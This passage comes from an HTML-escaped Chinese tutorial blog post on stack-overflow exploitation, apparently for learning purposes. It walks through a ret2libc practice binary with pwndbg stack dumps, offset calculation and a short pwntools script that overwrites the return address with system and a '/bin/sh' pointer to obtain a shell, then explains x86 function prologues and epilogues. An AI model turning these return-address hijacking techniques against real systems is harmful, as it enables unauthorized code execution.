&amp;lt;system@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		其活了,就覆盖返回地址为system,然后给它传参就好了,问题是怎么传参呢?栈的结构是怎样的?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220094904834.png&#34; alt=&#34;image-20230220094904834&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		当走到返回地址这里时,进入call system,就相当于新调用了一个函数,&lt;/p&gt;
&lt;p&gt;​		说实话这里还是不太懂流程,&lt;font color=&#34;red&#34;&gt;不过最好的办法就是自己去调试! &lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;► &lt;span class=&#34;number&#34;&gt;0xf7e4c623&lt;/span&gt; &amp;lt;gets+&lt;span class=&#34;number&#34;&gt;291&lt;/span&gt;&amp;gt;    push   ecx                           &amp;lt;_IO_2_1_stdin_&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0xf7e4c624&lt;/span&gt; &amp;lt;gets+&lt;span class=&#34;number&#34;&gt;292&lt;/span&gt;&amp;gt;    call   __uflow                    &amp;lt;__uflow&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0xf7e4c629&lt;/span&gt; &amp;lt;gets+&lt;span class=&#34;number&#34;&gt;297&lt;/span&gt;&amp;gt;    add    esp, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		在返回到system时,栈的结构就是这样子的了,符合上图..但也没啥…还是看书把..参见下面一章节&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│ esp &lt;span class=&#34;number&#34;&gt;0xffffd4e0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd4e4&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x8048720&lt;/span&gt; ◂— das     &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;/bin/sh&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		找到了俩地址之外,还要找好偏移,找偏移有很多种方法&lt;/p&gt;
&lt;p&gt;​		&amp;#x2F;&amp;#x2F; [sp+1Ch] [bp-64h]@1 这个可以吗?  &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;和pwn入门&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;-初识里面的例子一样,eax作为字符串的开始地址,一直往上走到ebp,所以可以在gets这里下断点,输入一些a,然后查看栈的布局即可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x8048677&lt;/span&gt;  &amp;lt;main+&lt;span class=&#34;number&#34;&gt;95&lt;/span&gt;&amp;gt;                  lea    eax, [esp + &lt;span class=&#34;number&#34;&gt;0x1c&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804867b&lt;/span&gt;  &amp;lt;main+&lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;&amp;gt;                  mov    dword ptr [esp], eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x804867e&lt;/span&gt;  &amp;lt;main+&lt;span class=&#34;number&#34;&gt;102&lt;/span&gt;&amp;gt;                 call   gets@plt                     &amp;lt;gets@plt&amp;gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│ esp &lt;span class=&#34;number&#34;&gt;0xffffd540&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xffffd55c&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd544&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd548&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;000&lt;/span&gt;c│     &lt;span class=&#34;number&#34;&gt;0xffffd54c&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd550&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0014&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd554&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x2c307d&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;&amp;#125;0,&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd558&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;001&lt;/span&gt;c│ eax &lt;span class=&#34;number&#34;&gt;0xffffd55c&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd560&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0040&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd580&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0060&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd5a0&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0080&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd5c0&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0084&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd5c4&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0088&lt;/span&gt;│ ebp &lt;span class=&#34;number&#34;&gt;0xffffd5c8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;008&lt;/span&gt;c│     &lt;span class=&#34;number&#34;&gt;0xffffd5cc&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xf7dfdfa1&lt;/span&gt; (__libc_start_main+&lt;span class=&#34;number&#34;&gt;241&lt;/span&gt;) ◂— add    esp, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0090&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd5d0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		上述例子中输入了108个a,所以缓冲区是108,然后ebp占4位,然后就是返回地址了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh  = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2libc1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = &lt;span class=&#34;number&#34;&gt;0x08048720&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = &lt;span class=&#34;number&#34;&gt;0x08048460&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;112&lt;/span&gt; + p32(system) + &lt;span class=&#34;string&#34;&gt;b&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; + p32(binsh) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
&lt;h2 id=&#34;函数调用、序言与后记&#34;&gt;&lt;a href=&#34;#函数调用、序言与后记&#34; class=&#34;headerlink&#34; title=&#34;函数调用、序言与后记&#34;&gt;&lt;/a&gt;函数调用、序言与后记&lt;/h2&gt;&lt;p&gt;​	《计算机安全导论深度实践》p99.&lt;/p&gt;
&lt;h3 id=&#34;函数调用&#34;&gt;&lt;a href=&#34;#函数调用&#34; class=&#34;headerlink&#34; title=&#34;函数调用&#34;&gt;&lt;/a&gt;函数调用&lt;/h3&gt;&lt;p&gt;​		为什么system后面是exit(就是返回地址),这是因为正常情况下,我们在call 一个函数的时候,也就是&lt;font color=&#34;red&#34;&gt;一个函数被调用的时候,会把它的返回地址压入栈中&lt;/font&gt;,等返回的时候取用,但是我们这里不是正常的call,而是直接覆盖掉了返回地址,所以就没有压栈的那个操作了,&lt;font color=&#34;red&#34;&gt;所以需要我们手动把返回地址写入里面&lt;/font&gt;. 此时push 返回地址进去后,esp就是下面序言的a状态&lt;/p&gt;
&lt;h3 id=&#34;序言&#34;&gt;&lt;a href=&#34;#序言&#34; class=&#34;headerlink&#34; title=&#34;序言&#34;&gt;&lt;/a&gt;序言&lt;/h3&gt;&lt;p&gt;​		序言就是函数开头处的代码,用于为函数准备栈和指针. IA-32(32位x86)体系结构中,序言内设指令为enter,具体是下面三条指令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pushl %ebp  //保存调用者的ebp值(用于被调用函数结束后,恢复之前调用函数的栈帧)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;movl %esp, %ebp //把esp赋值给ebp,这样ebp就到了 被调用函数的栈帧了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;subl %N, %esp  //给局部变量开辟一块空间&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220103110353.png&#34; alt=&#34;image-20230220103110353&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;后记&#34;&gt;&lt;a href=&#34;#后记&#34; class=&#34;headerlink&#34; title=&#34;后记&#34;&gt;&lt;/a&gt;后记&lt;/h3&gt;&lt;p&gt;​			函数末尾处的代码,用于恢复栈和寄存器到函数调用之前的状态. IA-32(32位x86)体系结构中,后记内设指令是leave,具体内容是下面三条指令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;movl %ebp, %esp //把ebp的值赋值给esp,释放掉开辟的栈空间&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;popl %ebp  //让ebp指回调用者函数的栈帧&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret        //返回  ret包含了两条指令,pop 和 jump(参上)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220103140222.png&#34; alt=&#34;image-20230220103140222&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;示例&#34;&gt;&lt;a href=&#34;#示例&#34; class=&#34;headerlink&#34; title=&#34;示例&#34;&gt;&lt;/a&gt;示例&lt;/h3&gt;&lt;p&gt;​		示例程序&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a = x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;bar&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b=&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        foo(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		gcc -m32 -S prog.c 编译成汇编代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;foo:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl	%ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl	%esp, %ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	subl	$16, %esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl	8(%ebp), %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl	%eax, -4(%ebp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret&lt;/span&gt;&lt;br&gt;&lt;span 